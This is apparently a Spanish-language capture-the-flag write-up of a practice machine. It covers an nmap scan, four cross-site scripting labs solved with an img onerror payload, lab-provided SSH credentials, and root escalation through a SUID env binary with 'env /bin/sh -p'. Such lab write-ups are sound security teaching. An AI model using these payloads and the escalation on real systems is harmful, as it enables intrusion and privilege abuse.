
## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache httpd (Ubuntu) |

---

## 2. Laboratorio 1 — XSS Reflejado con filtro de `<script>`

`http://172.17.0.2/laboratorio1/` presenta un campo de búsqueda que refleja el input en la página. El parámetro vulnerable es `input` via GET.

El payload básico no funciona porque el filtro bloquea la etiqueta `<script>`:

```
<script>alert(1)</script>   →   sin efecto
```

Se usa un vector alternativo con evento inline sobre una etiqueta de imagen:

```
<img src=x onerror=alert(1)>
```

URL resultante:

```
http://172.17.0.2/laboratorio1/?input=<img src=x onerror=alert(1)>
```

El navegador intenta cargar la imagen con `src="x"`, falla, dispara `onerror` y ejecuta el JavaScript. XSS confirmado.

---

## 3. Laboratorio 2 — XSS Almacenado via localStorage

`http://172.17.0.2/laboratorio2/` tiene un textarea que guarda mensajes en `localStorage` y los renderiza con `innerHTML`. La etiqueta `<script>` no se ejecuta al inyectarse via `innerHTML` — es un comportamiento del DOM, no un filtro del lab. Se usa el mismo vector de evento inline:

```
<img src=x onerror=alert(1)>
```

El payload se almacena en `localStorage` y se ejecuta cada vez que se carga la página, sin necesidad de volver a enviarlo. Eso es la diferencia clave respecto al laboratorio anterior: el XSS persiste para cualquier visitante que abra esa página en ese navegador.

---

## 4. Laboratorio 3 — XSS via Dropdown (bypass de restricción cliente)

`http://172.17.0.2/laboratorio3/` presenta tres menús desplegables. Los valores están limitados por la interfaz, pero los parámetros `opcion1`, `opcion2` y `opcion3` viajan en la URL como GET y se reflejan via `innerHTML` sin sanitizar.

Se modifica la URL directamente sin usar el formulario:

```
http://172.17.0.2/laboratorio3/?opcion1=<img src=x onerror=alert(1)>&opcion2=ValorX&opcion3=Opcion1
```

Los controles del lado del cliente (dropdowns, campos deshabilitados, botones ocultos) no constituyen validación — cualquier parámetro accesible desde la URL se puede manipular sin tocar la interfaz.

---

## 5. Laboratorio 4 — DOM XSS sobre parámetro GET

`http://172.17.0.2/laboratorio4/` refleja directamente el parámetro `data` de la URL en el DOM via `innerHTML`. No hay formulario — el lab indica explícitamente que se use `?data=`:

```
http://172.17.0.2/laboratorio4/?data=<img src=x onerror=alert(1)>
```

El valor se procesa íntegramente en JavaScript del lado del cliente sin pasar por el servidor.

---

## 6. Credenciales SSH

Completados los cuatro laboratorios, la máquina muestra las credenciales de acceso:

```
Usuario: balu
Password: balulero
```

```bash
ssh balu@172.17.0.2
# contraseña: balulero
```

---

## 7. Escalada a root — SUID en env

El home de `balu` está vacío. Sin entradas en sudoers. Se buscan binarios con SUID:

```bash
find / -perm -4000 2>/dev/null
```

Entre los resultados aparece `/usr/bin/env`. Un binario de propósito general con SUID puede ejecutar comandos heredando `euid=0`. Vector de GTFOBins:

```bash
env /bin/sh -p
```

```
# id
uid=1000(balu) gid=1000(balu) euid=0(root) groups=1000(balu),100(users)
# whoami
root
```

El flag `-p` hace que el shell no descarte los privilegios efectivos heredados del SUID.